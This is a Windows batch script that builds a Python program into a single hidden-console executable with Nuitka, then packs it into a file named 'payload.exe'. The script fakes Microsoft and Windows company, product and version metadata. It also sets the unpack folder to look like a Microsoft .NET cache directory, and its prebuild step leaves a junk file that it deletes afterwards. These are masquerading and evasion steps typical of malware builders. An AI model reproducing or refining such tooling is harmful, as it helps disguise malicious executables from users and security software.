@echo off
setlocal EnableExtensions EnableDelayedExpansion

:: Usage: build.bat <entry.py> [OutputName] [extra nuitka flags]
::
::   build.bat myapp\main.py MyApp
::   build.bat myapp\main.py MyApp --include-package=requests

set "_HERE=%~dp0"
set "_SRC=%~1"
set "_NAME=%~2"
set "_EXTRA=%~3"

if "!_SRC!"=="" (
    echo Usage: build.bat ^<entry.py^> [OutputName] [extra nuitka flags]
    exit /b 1
)
if not exist "!_SRC!" (
    echo [-] not found: !_SRC!
    exit /b 1
)
if "!_NAME!"=="" (
    for %%F in ("!_SRC!") do set "_NAME=%%~nF"
)

set "_SRCDIR=%~dp1"
set "_OUTEXE=!_SRCDIR!!_NAME!.exe"
set "_PAYLOAD=!_SRCDIR!payload.exe"

echo [*] src  : !_SRC!
echo [*] name : !_NAME!
echo [*] out  : !_SRCDIR!

echo [*] prebuild...
py "!_HERE!pack.py" prebuild "!_SRC!"
if !errorlevel! neq 0 ( echo [-] prebuild failed & exit /b 1 )

echo [*] compiling...
set "PATH=C:\Program Files\Microsoft Visual Studio\18\Insiders\VC\Tools\MSVC\14.42.34433\bin\Hostx64\x64;!PATH!"
set "VCToolsInstallDir=C:\Program Files\Microsoft Visual Studio\18\Insiders\VC\Tools\MSVC\14.42.34433\"
set "VCToolsVersion=14.42.34433"

pushd "!_SRCDIR!"
py -m nuitka --msvc=14.3 --onefile --windows-console-mode=disable --windows-company-name=Microsoft --windows-product-name=Windows --windows-file-version=10.0.0.1 "--onefile-tempdir-spec={CACHE_DIR}\Microsoft\NET" !_EXTRA! "!_SRC!"
set _ERR=!errorlevel!
popd

if exist "!_SRCDIR!_jnk.py" erase "!_SRCDIR!_jnk.py" >nul 2>&1
if !_ERR! neq 0 ( echo [-] nuitka failed & exit /b 1 )

echo [*] packing...
py "!_HERE!pack.py" pack "!_OUTEXE!" "!_PAYLOAD!"
set _ERR=!errorlevel!
if exist "!_OUTEXE!" erase "!_OUTEXE!" >nul 2>&1
if !_ERR! neq 0 ( echo [-] pack failed & exit /b 1 )

echo [+] done: !_PAYLOAD!
